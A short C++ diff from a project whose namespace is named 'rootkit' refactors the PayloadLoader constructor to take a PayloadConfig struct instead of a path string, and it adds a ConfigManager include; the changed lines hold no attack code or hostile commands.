@@ -1,4 +1,5 @@
 #include "rootkit/PayloadLoader.hpp"
+#include "rootkit/ConfigManager.hpp"
 #include "rootkit/issues/Warning.hpp"
 
 #include <chrono>
@@ -8,9 +9,9 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-rootkit::PayloadLoader::PayloadLoader(const std::string& payload_path,
+rootkit::PayloadLoader::PayloadLoader(const PayloadConfig& conf,
         const issues::Logger& logger)
-    :payload_path(payload_path),
+    :payload_path(conf.path),
     info(logger),
     warning(logger),
     error(logger)
